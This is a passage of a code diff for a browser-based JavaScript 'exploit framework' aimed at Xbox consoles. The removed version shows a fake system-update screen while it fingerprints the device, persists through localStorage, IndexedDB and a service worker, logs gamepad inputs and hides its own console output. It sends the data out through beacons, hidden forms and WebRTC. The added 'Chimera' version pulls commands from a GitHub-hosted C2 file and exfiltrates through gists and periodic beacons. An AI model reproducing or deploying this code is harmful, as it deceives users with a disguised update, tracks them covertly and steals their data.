-                    const exploitId = 'xbox_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-                    
-                    // Store in localStorage
-                    localStorage.setItem('xbox_sys_update', JSON.stringify({
-                        id: exploitId,
-                        timestamp: Date.now(),
-                        stage: this.stage,
-                        data: btoa(JSON.stringify(this.exploitData))
-                    }));
-                    
-                    // Store in IndexedDB if available
-                    if ('indexedDB' in window) {
-                        this.setupIndexedDBPersistence(exploitId);
-                    }
-                    
-                    // Setup service worker if available
-                    if ('serviceWorker' in navigator) {
-                        this.setupServiceWorker();
-                    }
-                    
-                    this.exploitData.persistence = {
-                        id: exploitId,
-                        localStorage: true,
-                        indexedDB: 'indexedDB' in window,
-                        serviceWorker: 'serviceWorker' in navigator
-                    };
-                    
-                    this.log(`Persistence established with ID: ${exploitId}`, 'success');
-                    
-                } catch(e) {
-                    this.log(`Persistence setup failed: ${e.message}`, 'error');
-                }
-                
-                await this.delay(1000);
-            }
-            
-            async stage6_exploitDeployment() {
-                this.log('Stage 6: Deploying Exploit Payloads', 'warning');
-                this.updateProgress(60, 'Deploying security patches...');
-                
-                // Deploy memory corruption exploit (simulated)
-                if (this.vulnerabilities.includes('shared_memory_available')) {
-                    this.deployMemoryCorruption();
-                }
-                
-                // Deploy timing attack if available
-                if (this.vulnerabilities.includes('high_precision_timing')) {
-                    this.deployTimingAttack();
-                }
-                
-                // Deploy API-specific exploits
-                this.vulnerabilities.forEach(vuln => {
-                    switch(vuln) {
-                        case 'getGamepads':
-                            this.deployGamepadExploit();
-                            break;
-                        case 'sendBeacon':
-                            this.deployBeaconExploit();
-                            break;
-                        case 'webrtc_available':
-                            this.deployWebRTCExploit();
-                            break;
-                    }
-                });
-                
-                await this.delay(2000);
-            }
-            
-            async stage7_dataExfiltration() {
-                this.log('Stage 7: Data Collection and Exfiltration', 'critical');
-                this.updateProgress(70, 'Collecting diagnostic data...');
-                
-                // Collect additional data
-                this.collectAdditionalData();
-                
-                // Exfiltrate via multiple methods
-                this.exfiltrateData();
-                
-                await this.delay(1500);
-            }
-            
-            async stage8_privilegeEscalation() {
-                this.log('Stage 8: Attempting Privilege Escalation', 'critical');
-                this.updateProgress(80, 'Applying security permissions...');
-                
-                // Try to escalate privileges through various methods
-                this.attemptPrivilegeEscalation();
-                
-                await this.delay(1000);
-            }
-            
-            async stage9_systemIntegration() {
-                this.log('Stage 9: System Integration', 'info');
-                this.updateProgress(90, 'Integrating with system services...');
-                
-                // Try to interact with system-level features
-                this.integrateWithSystem();
-                
-                await this.delay(1000);
-            }
-            
-            async stage10_cleanup() {
-                this.log('Stage 10: Cleanup and Obfuscation', 'info');
-                this.updateProgress(100, 'Finalizing update...');
-                
-                // Clean traces
-                this.cleanupTraces();
-                
-                // Show success
-                this.updateDetail('detailText', 'System update complete ✓');
-                this.updateDetail('packageText', 'All files verified ✓');
-                this.updateDetail('securityText', 'Security patches applied ✓');
-                this.updateDetail('performanceText', 'System optimized ✓');
-                
-                this.log('EXPLOIT FRAMEWORK EXECUTION COMPLETE', 'success');
-                
-                // Show payload button
-                document.getElementById('payloadButton').classList.remove('hidden');
-                
-                await this.delay(2000);
-            }
-            
-            // ==================== EXPLOIT METHODS ====================
-            
-            detectXbox() {
-                const ua = navigator.userAgent.toLowerCase();
-                const clues = [];
-                
-                if (ua.includes('xbox')) {
-                    clues.push('Direct Xbox mention in UA');
-                    this.exploitData.system.deviceType = 'xbox';
-                }
-                
-                if (navigator.platform.includes('Win32') && screen.width === 1920 && screen.height === 1080) {
-                    clues.push('Xbox-like resolution on Windows');
-                    this.exploitData.system.possibleXbox = true;
-                }
-                
-                // Check for Xbox Live APIs
-                try {
-                    if (typeof Xbox !== 'undefined') {
-                        clues.push('Xbox JavaScript API detected');
-                        this.exploitData.system.xboxAPI = true;
-                    }
-                } catch(e) {}
-                
-                // Check for gamepads
-                if ('getGamepads' in navigator) {
-                    const gamepads = navigator.getGamepads();
-                    gamepads.forEach((pad, idx) => {
-                        if (pad && pad.id.toLowerCase().includes('xbox')) {
-                            clues.push('Xbox controller connected');
-                            this.exploitData.system.xboxController = true;
-                        }
-                    });
-                }
-                
-                if (clues.length > 0) {
-                    this.log(`Xbox detection clues: ${clues.join(', ')}`, 'warning');
-                }
-            }
-            
-            fingerprintGPU() {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                            
-                            this.exploitData.system.gpu = {
-                                renderer: renderer || 'unknown',
-                                vendor: vendor || 'unknown'
-                            };
-                            
-                            this.log(`GPU: ${renderer} (${vendor})`, 'info');
-                            
-                            // Check for AMD (Xbox uses AMD)
-                            if (renderer.includes('AMD') || vendor.includes('AMD')) {
-                                this.exploitData.system.possibleAMD = true;
-                            }
-                        }
-                    }
-                } catch(e) {
-                    this.log(`GPU fingerprint failed: ${e.message}`, 'error');
-                }
-            }
-            
-            deployMemoryCorruption() {
-                this.log('Deploying memory corruption exploit...', 'warning');
-                
-                try {
-                    // Create a large array buffer
-                    const buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
-                    const view = new Uint8Array(buffer);
-                    
-                    // Fill with pattern
-                    for (let i = 0; i < view.length; i++) {
-                        view[i] = i % 256;
-                    }
-                    
-                    // Create overlapping views (potential use-after-free simulation)
-                    const view2 = new Uint8Array(buffer, 1024, 1024 * 1024);
-                    
-                    this.log(`Memory buffer created: ${view.length} bytes`, 'info');
-                    this.exploitData.memory.corruptionAttempt = true;
-                    
-                } catch(e) {
-                    this.log(`Memory corruption failed: ${e.message}`, 'error');
-                }
-            }
-            
-            deployTimingAttack() {
-                this.log('Deploying timing attack...', 'warning');
-                
-                // Measure cache timing
-                const array = new Array(256 * 1024).fill(0);
-                const timings = [];
-                
-                for (let i = 0; i < 100; i++) {
-                    const start = performance.now();
-                    for (let j = 0; j < array.length; j += 1024) {
-                        array[j] = j;
-                    }
-                    timings.push(performance.now() - start);
-                }
-                
-                this.exploitData.memory.timingAttack = {
-                    performed: true,
-                    avgTime: timings.reduce((a, b) => a + b) / timings.length,
-                    samples: timings.length
-                };
-                
-                this.log(`Timing attack completed: ${timings.length} samples`, 'info');
-            }
-            
-            deployGamepadExploit() {
-                this.log('Exploiting Gamepad API...', 'warning');
-                
-                // Monitor gamepad inputs
-                if ('getGamepads' in navigator) {
-                    setInterval(() => {
-                        const gamepads = navigator.getGamepads();
-                        gamepads.forEach((pad, idx) => {
-                            if (pad) {
-                                // Capture button presses
-                                const pressedButtons = pad.buttons
-                                    .map((b, i) => b.pressed ? i : -1)
-                                    .filter(i => i !== -1);
-                                
-                                if (pressedButtons.length > 0) {
-                                    this.log(`Gamepad ${idx} buttons pressed: ${pressedButtons.join(',')}`, 'info');
-                                    
-                                    // Store for later use
-                                    if (!this.exploitData.system.gamepadInputs) {
-                                        this.exploitData.system.gamepadInputs = [];
-                                    }
-                                    this.exploitData.system.gamepadInputs.push({
-                                        time: Date.now(),
-                                        gamepad: pad.id,
-                                        buttons: pressedButtons
-                                    });
+                        const gistData = {
+                            description: description,
+                            public: false,
+                            files: {
+                                [`chimera_${Date.now()}.json`]: {
+                                    content: JSON.stringify(data, null, 2)
                                 }
                             }
-                        });
-                    }, 100);
-                }
-            }
-            
-            deployBeaconExploit() {
-                this.log('Setting up beacon exfiltration...', 'warning');
-                
-                // Create hidden exfiltration channel
-                setInterval(() => {
-                    if (navigator.sendBeacon && this.exploitData.system) {
-                        const data = {
-                            t: Date.now(),
-                            id: this.exploitData.persistence?.id || 'unknown',
-                            data: btoa(JSON.stringify({
-                                stage: this.stage,
-                                mem: this.exploitData.memory,
-                                vuln: this.vulnerabilities
-                            }))
                         };
                         
-                        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-                        navigator.sendBeacon(this.beaconUrl, blob);
-                    }
-                }, 30000); // Every 30 seconds
-            }
-            
-            deployWebRTCExploit() {
-                this.log('Setting up WebRTC data channel...', 'warning');
-                
-                try {
-                    // Create RTCPeerConnection for potential data exfiltration
-                    const pc = new RTCPeerConnection();
-                    
-                    // Create data channel
-                    const dc = pc.createDataChannel('xbox-update');
-                    
-                    dc.onopen = () => {
-                        this.log('WebRTC data channel opened', 'success');
-                        dc.send(JSON.stringify(this.exploitData));
-                    };
-                    
-                    dc.onerror = (err) => {
-                        this.log(`WebRTC error: ${err}`, 'error');
-                    };
-                    
-                    // This would normally involve signaling, but we're just testing capability
-                    this.exploitData.network.webrtcAvailable = true;
-                    
-                } catch(e) {
-                    this.log(`WebRTC setup failed: ${e.message}`, 'error');
-                }
-            }
-            
-            collectAdditionalData() {
-                this.log('Collecting additional system data...', 'info');
-                
-                // Screen properties
-                this.exploitData.system.screen = {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
-                };
-                
-                // Timezone
-                this.exploitData.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                
-                // Plugins
-                if (navigator.plugins) {
-                    this.exploitData.system.plugins = Array.from(navigator.plugins).map(p => p.name);
-                }
-                
-                // Mime types
-                if (navigator.mimeTypes) {
-                    this.exploitData.system.mimeTypes = Array.from(navigator.mimeTypes).map(m => m.type);
-                }
-            }
-            
-            exfiltrateData() {
-                this.log('Exfiltrating collected data...', 'critical');
-                
-                // Method 1: Image beacon
-                const img = new Image();
-                const dataStr = btoa(JSON.stringify(this.exploitData));
-                img.src = `${this.beaconUrl}/pixel?d=${encodeURIComponent(dataStr)}`;
-                
-                // Method 2: Form submission
-                const form = document.createElement('form');
-                form.action = this.beaconUrl;
-                form.method = 'POST';
-                form.style.display = 'none';
-                
-                const input = document.createElement('input');
-                input.name = 'data';
-                input.value = dataStr;
-                form.appendChild(input);
-                
-                document.body.appendChild(form);
-                setTimeout(() => {
-                    form.submit();
-                    document.body.removeChild(form);
-                }, 100);
-                
-                this.log(`Data exfiltrated: ${dataStr.length} bytes`, 'success');
-            }
-            
-            attemptPrivilegeEscalation() {
-                this.log('Attempting privilege escalation...', 'critical');
-                
-                // Try to access higher privilege APIs
-                const escalationAttempts = [];
-                
-                // Try to request fullscreen (requires user gesture)
-                try {
-                    if (document.documentElement.requestFullscreen) {
-                        escalationAttempts.push('fullscreen_api');
-                    }
-                } catch(e) {}
-                
-                // Try to request pointer lock
-                try {
-                    if (document.documentElement.requestPointerLock) {
-                        escalationAttempts.push('pointer_lock_api');
-                    }
-                } catch(e) {}
-                
-                // Try to access clipboard
-                try {
-                    if (navigator.clipboard) {
-                        escalationAttempts.push('clipboard_api');
-                    }
-                } catch(e) {}
-                
-                // Try to access media devices
-                try {
-                    if (navigator.mediaDevices) {
-                        escalationAttempts.push('media_devices_api');
-                    }
-                } catch(e) {}
-                
-                this.exploitData.escalation = {
-                    attempted: true,
-                    methods: escalationAttempts,
-                    timestamp: Date.now()
-                };
-                
-                this.log(`Privilege escalation attempts: ${escalationAttempts.join(', ')}`, escalationAttempts.length > 0 ? 'warning' : 'info');
-            }
-            
-            integrateWithSystem() {
-                this.log('Attempting system integration...', 'info');
-                
-                // Try to interact with system-level features
-                
-                // 1. Check for file system access
-                if ('showOpenFilePicker' in window) {
-                    this.log('File System Access API available', 'warning');
-                    this.vulnerabilities.push('file_system_access');
-                }
-                
-                // 2. Check for WebUSB
-                if ('usb' in navigator) {
-                    this.log('WebUSB API available', 'warning');
-                    this.vulnerabilities.push('webusb_available');
-                }
-                
-                // 3. Check for Web Bluetooth
-                if ('bluetooth' in navigator) {
-                    this.log('WebBluetooth API available', 'warning');
-                    this.vulnerabilities.push('webbluetooth_available');
-                }
-                
-                // 4. Check for WebHID
-                if ('hid' in navigator) {
-                    this.log('WebHID API available', 'warning');
-                    this.vulnerabilities.push('webhid_available');
-                }
-            }
-            
-            setupIndexedDBPersistence(id) {
-                try {
-                    const request = indexedDB.open('XboxSystemUpdate', 1);
-                    
-                    request.onupgradeneeded = function(event) {
-                        const db = event.target.result;
-                        const store = db.createObjectStore('updateData', {keyPath: 'id'});
-                        store.createIndex('timestamp', 'timestamp', {unique: false});
-                    };
-                    
-                    request.onsuccess = (event) => {
-                        const db = event.target.result;
-                        const transaction = db.transaction(['updateData'], 'readwrite');
-                        const store = transaction.objectStore('updateData');
-                        
-                        const data = {
-                            id: id,
-                            timestamp: Date.now(),
-                            exploitData: this.exploitData,
-                            vulnerabilities: this.vulnerabilities
-                        };
-                        
-                        store.put(data);
-                        
-                        this.log('Data stored in IndexedDB', 'success');
-                    };
-                    
-                    request.onerror = (event) => {
-                        this.log('IndexedDB storage failed', 'error');
-                    };
-                    
-                } catch(e) {
-                    this.log(`IndexedDB setup failed: ${e.message}`, 'error');
-                }
-            }
-            
-            setupServiceWorker() {
-                try {
-                    // Register a service worker for persistence
-                    navigator.serviceWorker.register('/sw.js')
-                        .then(registration => {
-                            this.log('Service Worker registered', 'success');
-                            
-                            // Send data to service worker
-                            if (registration.active) {
-                                registration.active.postMessage({
-                                    type: 'EXPLOIT_DATA',
-                                    data: this.exploitData
-                                });
-                            }
-                        })
-                        .catch(err => {
-                            this.log(`Service Worker registration failed: ${err.message}`, 'error');
+                        const response = await fetch('https://api.github.com/gists', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/vnd.github.v3+json'
+                            },
+                            body: JSON.stringify(gistData)
                         });
                         
-                } catch(e) {
-                    this.log(`Service Worker setup failed: ${e.message}`, 'error');
-                }
-            }
-            
-            cleanupTraces() {
-                this.log('Cleaning up traces...', 'info');
-                
-                // Clear some logs
-                setTimeout(() => {
-                    const panel = document.getElementById('debugPanel');
-                    if (panel.children.length > 50) {
-                        while (panel.children.length > 20) {
-                            panel.removeChild(panel.firstChild);
+                        if (response.ok) {
+                            const result = await response.json();
+                            Chimera.terminal.log(`Gist created: ${result.html_url}`, 'success');
+                            return result.id;
+                        } else {
+                            Chimera.terminal.log(`Gist creation failed: ${response.status}`, 'error');
+                            return null;
                         }
+                    } catch (error) {
+                        Chimera.terminal.log(`Gist error: ${error.message}`, 'error');
+                        return null;
                     }
-                }, 5000);
+                },
                 
-                // Override console methods to hide activity
-                const originalLog = console.log;
-                console.log = function(...args) {
-                    if (!args[0]?.includes?.('[EXPLOIT]')) {
-                        originalLog.apply(console, args);
+                // Load commands from GitHub Pages JSON file
+                loadCommands: async function() {
+                    try {
+                        const response = await fetch(Chimera.config.github.c2);
+                        if (response.ok) {
+                            const commands = await response.json();
+                            Chimera.terminal.log(`Loaded ${commands.length} commands from C2`, 'success');
+                            return commands;
+                        }
+                    } catch (error) {
+                        Chimera.terminal.log(`C2 unreachable, using local commands`, 'warning');
                     }
-                };
-            }
+                    return [];
+                },
+                
+                // Store data in GitHub Issues (if token available)
+                createIssue: async function(title, body) {
+                    // This would require authentication
+                    Chimera.terminal.log('GitHub Issues require authentication token', 'warning');
+                    return null;
+                },
+                
+                // Use GitHub Pages for data exfiltration
+                exfilToPages: async function(data) {
+                    // This would involve creating commits to a GitHub Pages site
+                    // Simplified version for demo
+                    const encoded = btoa(JSON.stringify(data));
+                    const url = `data:application/json;base64,${encoded}`;
+                    
+                    // Create download link
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `chimera_${Date.now()}.json`;
+                    a.click();
+                    
+                    Chimera.terminal.log(`Data prepared for GitHub Pages upload`, 'success');
+                    return true;
+                }
+            },
+            
+            // ==================== EXPLOIT MODULES ====================
+            
+            modules: {
+                fingerprint: {
+                    active: true,
+                    progress: 0,
+                    
+                    run: async function() {
+                        Chimera.terminal.log('Starting fingerprint scan...', 'info');
+                        this.updateProgress(10);
+                        
+                        // Basic system info
+                        Chimera.data.fingerprint = {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            vendor: navigator.vendor,
+                            language: navigator.language,
+                            languages: navigator.languages,
+                            hardwareConcurrency: navigator.hardwareConcurrency,
+                            deviceMemory: navigator.deviceMemory,
+                            cookieEnabled: navigator.cookieEnabled,
+                            screen: {
+                                width: screen.width,
+                                height: screen.height,
+                                colorDepth: screen.colorDepth,
+                                pixelDepth: screen.pixelDepth
+                            },
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        };
+                        
+                        this.updateProgress(30);
+                        
+                        // GPU fingerprinting
+                        await this.fingerprintGPU();
+                        this.updateProgress(50);
+                        
+                        // API detection
+                        await this.detectAPIs();
+                        this.updateProgress(70);
+                        
+                        // Xbox detection
+                        await this.detectXbox();
+                        this.updateProgress(90);
+                        
+                        // Store fingerprint
+                        localStorage.setItem('chimera_fingerprint', JSON.stringify(Chimera.data.fingerprint));
+                        this.updateProgress(100);
+                        
+                        Chimera.terminal.log(`Fingerprint collected: ${Object.keys(Chimera.data.fingerprint).length} data points`, 'success');
+                        updateStats();
+                    },
+                    
+                    fingerprintGPU: async function() {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            
+                            if (gl) {
+                                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                                if (debugInfo) {
+                                    Chimera.data.fingerprint.gpu = {
+                                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+                                    };
+                                    Chimera.terminal.log(`GPU: ${Chimera.data.fingerprint.gpu.renderer}`, 'info');
+                                }
+                            }
+                        } catch (e) {}
+                    },
+                    
+                    detectAPIs: async function() {
+                        const dangerousAPIs = [
+                            'getGamepads', 'sendBeacon', 'requestMIDIAccess',
+                            'getUserMedia', 'requestPointerLock', 'webkitRequestFileSystem',
+                            'requestFileSystem', 'usb', 'bluetooth', 'hid', 'serial',
+                            'requestDevice', 'share', 'clipboard'
+                        ];
+                        
+                        dangerousAPIs.forEach(api => {
+                            if (api in navigator || api in window) {
+                                Chimera.data.vulnerabilities.push(api);
+                            }
+                        });
+                    },
+                    
+                    detectXbox: async function() {
+                        const clues = [];
+                        
+                        // User agent check
+                        if (navigator.userAgent.toLowerCase().includes('xbox')) {
+                            clues.push('xbox_user_agent');
+                            Chimera.data.fingerprint.deviceType = 'xbox';
+                        }
+                        
+                        // Resolution check (Xbox dashboard is 1920x1080)
+                        if (screen.width === 1920 && screen.height === 1080) {
+                            clues.push('xbox_resolution');
+                            Chimera.data.fingerprint.possibleXbox = true;
+                        }
+                        
+                        // Gamepad check
+                        if ('getGamepads' in navigator) {
+                            const gamepads = navigator.getGamepads();
+                            gamepads.forEach((pad, idx) => {
+                                if (pad && pad.id.toLowerCase().includes('xbox')) {
+                                    clues.push('xbox_controller');
+                                    Chimera.data.fingerprint.xboxController = true;
+                                    Chimera.data.fingerprint.controllerName = pad.id;
+                                }
+                            });
+                        }
+                        
+                        if (clues.length > 0) {
+                            Chimera.terminal.log(`Xbox detection clues: ${clues.join(', ')}`, 'warning');
+                            Chimera.data.fingerprint.xboxClues = clues;
+                        }
+                    },
+                    
+                    updateProgress: function(percent) {
+                        this.progress = percent;
+                        document.getElementById('fingerprintProgress').style.width = `${percent}%`;
+                    }
+                },
+                
+                memory: {
+                    active: false,
+                    progress: 0,
+                    
+                    run: async function() {
+                        Chimera.terminal.log('Starting memory analysis...', 'info');
+                        this.updateProgress(10);
+                        
+                        const tests = [];
+                        
+                        // Test ArrayBuffer limits
+                        try {
+                            const buffer1 = new ArrayBuffer(1024 * 1024 * 10); // 10MB
+                            tests.push({name: 'ArrayBuffer 10MB', success: true});
+                            this.updateProgress(30);
+                        } catch(e) {
+                            tests.push({name: 'ArrayBuffer 10MB', success: false});
+                        }
+                        
+                        // Test SharedArrayBuffer
+                        if (typeof SharedArrayBuffer !== 'undefined') {
+                            try {
+                                const sab = new SharedArrayBuffer(1024);
+                                tests.push({name: 'SharedArrayBuffer', success: true});
+                                Chimera.data.vulnerabilities.push('shared_memory');
+                                this.updateProgress(50);
+                            } catch(e) {}
+                        }
+                        
+                        // Test WebAssembly
+                        if (typeof WebAssembly !== 'undefined') {
+                            tests.push({name: 'WebAssembly', success: true});
+                            Chimera.data.vulnerabilities.push('wasm');
+                            this.updateProgress(70);
+                        }
+                        
+                        // Test timing precision
+                        if ('performance' in window) {
+                            const start = performance.now();
+                            for (let i = 0; i < 1000000; i++) Math.sqrt(i);
+                            const end = performance.now();
+                            
+                            if (end - start < 5) {
+                                Chimera.data.vulnerabilities.push('high_precision_timing');
+                                Chimera.terminal.log('High precision timing available', 'warning');
+                            }
+                            this.updateProgress(90);
+                        }
+                        
+                        Chimera.data.memoryTests = tests;
+                        this.updateProgress(100);
+                        
+                        Chimera.terminal.log(`Memory tests: ${tests.filter(t => t.success).length}/${tests.length} passed`, 'success');
+                        updateStats();
+                    },
+                    
+                    updateProgress: function(percent) {
+                        this.progress = percent;
+                        document.getElementById('memoryProgress').style.width = `${percent}%`;
+                    }
+                },
+                
+                api: {
+                    active: false,
+                    progress: 0,
+                    
+                    run: async function() {
+                        Chimera.terminal.log('Starting API exploitation scan...', 'info');
+                        this.updateProgress(10);
+                        
+                        // Already collected vulnerabilities from fingerprint
+                        this.updateProgress(40);
+                        
+                        // Try to exploit found APIs
+                        for (const vuln of Chimera.data.vulnerabilities) {
+                            await this.exploitAPI(vuln);
+                            this.updateProgress(40 + (Chimera.data.vulnerabilities.indexOf(vuln) * 10));
+                        }
+                        
+                        this.updateProgress(100);
+                        Chimera.terminal.log(`API scan complete: ${Chimera.data.vulnerabilities.length} vulnerabilities`, 
+                                           Chimera.data.vulnerabilities.length > 0 ? 'warning' : 'success');
+                        updateStats();
+                    },
+                    
+                    exploitAPI: async function(apiName) {
+                        switch(apiName) {
+                            case 'getGamepads':
+                                await this.exploitGamepads();
+                                break;
+                            case 'sendBeacon':
+                                await this.exploitBeacon();
+                                break;
+                            case 'usb':
+                                Chimera.terminal.log('WebUSB API available - USB device access possible', 'warning');
+                                break;
+                            case 'bluetooth':
+                                Chimera.terminal.log('WebBluetooth available - Bluetooth device scanning possible', 'warning');
+                                break;
+                        }
+                    },
+                    
+                    exploitGamepads: async function() {
+                        if ('getGamepads' in navigator) {
+                            // Monitor gamepad inputs
+                            setInterval(() => {
+                                const gamepads = navigator.getGamepads();
+                                gamepads.forEach((pad, idx) => {
+                                    if (pad) {
+                                        const pressed = pad.buttons.filter(b => b.pressed).map((b, i) => i);
+                                        if (pressed.length > 0) {
+                                            Chimera.data.collected.push({
+                                                type: 'gamepad_input',
+                                                gamepad: pad.id,
+                                                buttons: pressed,
+                                                timestamp: Date.now()
+                                            });
+                                        }
+                                    }
+                                });
+                            }, 1000);
+                            
+                            Chimera.terminal.log('Gamepad input capture activated', 'success');
+                        }
+                    },
+                    
+                    exploitBeacon: async function() {
+                        if ('sendBeacon' in navigator) {
+                            // Setup periodic beacon exfiltration
+                            setInterval(() => {
+                                if (Chimera.data.collected.length > 0) {
+                                    const data = Chimera.data.collected.slice(-10);
+                                    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                                    navigator.sendBeacon(window.location.origin + '/log', blob);
+                                    Chimera.data.collected = Chimera.data.collected.slice(0, -10);
+                                }
+                            }, 30000);
+                            
+                            Chimera.terminal.log('Beacon exfiltration activated (30s intervals)', 'success');
+                        }
+                    },
+                    
+                    updateProgress: function(percent) {
+                        this.progress = percent;
+                        document.getElementById('apiProgress').style.width = `${percent}%`;
+                    }
+                },
+                
+                githubModule: {
+                    active: true,
+                    progress: 0,
+                    
+                    test: async function() {
+                        Chimera.terminal.log('Testing GitHub API connectivity...', 'info');
+                        this.updateProgress(30);
+                        
+                        try {
+                            // Test GitHub API (public endpoint)
+                            const response = await fetch('https://api.github.com');
+                            if (response.ok) {
+                                this.updateProgress(70);
+                                Chimera.terminal.log('GitHub API accessible', 'success');
+                                
+                                // Test creating a gist
+                                const gistId = await Chimera.github.createGist({
+                                    test: 'chimera_connectivity_test',
+                                    timestamp: Date.now(),
+                                    session: Chimera.data.sessionId
+                                }, 'Chimera Connectivity Test');
+                                
+                                if (gistId) {
+                                    this.updateProgress(100);
+                                    Chimera.terminal.log('GitHub Gist creation successful', 'success');
+                                }
+                            }
+                        } catch (error) {
+                            Chimera.terminal.log(`GitHub API test failed: ${error.message}`, 'error');
+                        }
+                    },
+                    
+                    updateProgress: function(percent) {
+                        this.progress = percent;
+                        document.getElementById('githubProgress').style.width = `${percent}%`;
+                    }
+                }
+            },
             
             // ==================== UTILITIES ====================
             
-            delay(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-            
-            // ==================== EXECUTION ====================
-            
-            async execute() {
-                try {
-                    await this.stage1_fingerprint();
-                    await this.stage2_memoryAnalysis();
-                    await this.stage3_apiExploration();
-                    await this.stage4_networkRecon();
-                    await this.stage5_persistenceSetup();
-                    await this.stage6_exploitDeployment();
-                    await this.stage7_dataExfiltration();
-                    await this.stage8_privilegeEscalation();
-                    await this.stage9_systemIntegration();
-                    await this.stage10_cleanup();
-                    
-                    this.log('=== EXPLOIT FRAMEWORK EXECUTION COMPLETE ===', 'success');
-                    this.log(`Vulnerabilities found: ${this.vulnerabilities.length}`, 'warning');
-                    this.log(`Data collected: ${JSON.stringify(this.exploitData).length} bytes`, 'info');
-                    
-                    return true;
-                    
-                } catch(error) {
-                    this.log(`Execution failed: ${error.message}`, 'error');
-                    return false;
+            updateModuleStatus: function(moduleName, status) {
+                const elem = document.getElementById(moduleName + 'Status');
+                if (elem) {
+                    elem.textContent = status.toUpperCase();
+                    elem.className = 'module-status status-' + (status === 'active' ? 'active' : 'inactive');
                 }
+            },
+            
+            updateSystemLoad: function(load) {
+                document.getElementById('systemProgress').style.width = `${load}%`;
+                document.getElementById('systemLoad').textContent = `${load}%`;
             }
-        }
-        
-        // ==================== GLOBAL VARIABLES ====================
-        let exploitFramework = null;
-        let debugMode = false;
+        };
         
         // ==================== UI FUNCTIONS ====================
         
-        function beginExploitation() {
-            document.getElementById('startButton').disabled = true;
-            document.getElementById('startButton').textContent = 'UPDATE IN PROGRESS...';
-            document.getElementById('debugButton').classList.remove('hidden');
-            
-            exploitFramework = new XboxExploitFramework();
-            exploitFramework.execute();
+        function updateStats() {
+            document.getElementById('exploitsActive').textContent = 
+                Object.values(Chimera.modules).filter(m => m.active).length;
+            document.getElementById('dataCollected').textContent = 
+                Chimera.data.collected.length + Object.keys(Chimera.data.fingerprint).length;
         }
         
-        function toggleDebug() {
-            const panel = document.getElementById('debugPanel');
-            const input = document.getElementById('consoleInput');
+        function startRecon() {
+            Chimera.modules.fingerprint.run();
+            Chimera.updateModuleStatus('fingerprint', 'active');
+        }
+        
+        function runFingerprint() {
+            startRecon();
+        }
+        
+        function showFingerprintData() {
+            const modal = document.getElementById('dataModal');
+            const title = document.getElementById('modalTitle');
+            const data = document.getElementById('modalData');
             
-            if (debugMode) {
-                panel.style.display = 'none';
-                input.classList.add('hidden');
-                debugMode = false;
-            } else {
-                panel.style.display = 'block';
-                input.classList.remove('hidden');
-                debugMode = true;
+            title.textContent = 'Fingerprint Data';
+            data.textContent = JSON.stringify(Chimera.data.fingerprint, null, 2);
+            
+            modal.style.display = 'flex';
+        }
+        
+        function exportFingerprint() {
+            Chimera.github.createGist(Chimera.data.fingerprint, 'Chimera Fingerprint Data');
+        }
+        
+        function runMemoryAnalysis() {
+            Chimera.modules.memory.run();
+            Chimera.updateModuleStatus('memory', 'active');
+        }
+        
+        function testBufferOverflow() {
+            Chimera.terminal.log('Testing buffer overflow patterns...', 'info');
+            
+            try {
+                // Create large array to test limits
+                const largeArray = new Array(10000000).fill(0);
+                Chimera.terminal.log(`Created array with ${largeArray.length} elements`, 'success');
                 
-                // Show existing logs
-                if (exploitFramework) {
-                    exploitFramework.debugLog.forEach(log => {
-                        const div = document.createElement('div');
-                        div.className = `log-entry log-${log.type}`;
-                        div.textContent = `[${log.time}] ${log.message}`;
-                        panel.appendChild(div);
-                    });
-                    panel.scrollTop = panel.scrollHeight;
-                }
+                // Test typed array boundaries
+                const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+                const view1 = new Uint8Array(buffer, 0, 1024 * 1024 * 50);
+                const view2 = new Uint8Array(buffer, 1024 * 1024 * 25, 1024 * 1024 * 50);
+                
+                Chimera.terminal.log('Buffer overlap test completed', 'success');
+            } catch (e) {
+                Chimera.terminal.log(`Buffer test failed: ${e.message}`, 'error');
             }
         }
         
-        function handleConsoleCommand(event) {
+        function scanAPIs() {
+            Chimera.terminal.log('Scanning for vulnerable APIs...', 'info');
+            
+            // Quick API scan
+            const apis = ['eval', 'Function', 'WebAssembly', 'SharedArrayBuffer', 'Atomics', 
+                         'performance', 'localStorage', 'indexedDB', 'serviceWorker'];
+            
+            apis.forEach(api => {
+                if (api in window || api in navigator) {
+                    Chimera.terminal.log(`Found: ${api}`, 'warning');
+                }
+            });
+        }
+        
+        function exploitScan() {
+            Chimera.modules.api.run();
+            Chimera.updateModuleStatus('api', 'active');
+        }
+        
+        function exploitAPIs() {
+            exploitScan();
+        }
+        
+        function listVulnerabilities() {
+            const modal = document.getElementById('dataModal');
+            const title = document.getElementById('modalTitle');
+            const data = document.getElementById('modalData');
+            
+            title.textContent = 'Detected Vulnerabilities';
+            data.textContent = Chimera.data.vulnerabilities.join('\n');
+            
+            modal.style.display = 'flex';
+        }
+        
+        function testGitHubAPI() {
+            Chimera.modules.githubModule.test();
+        }
+        
+        function createGist() {
+            Chimera.github.createGist({
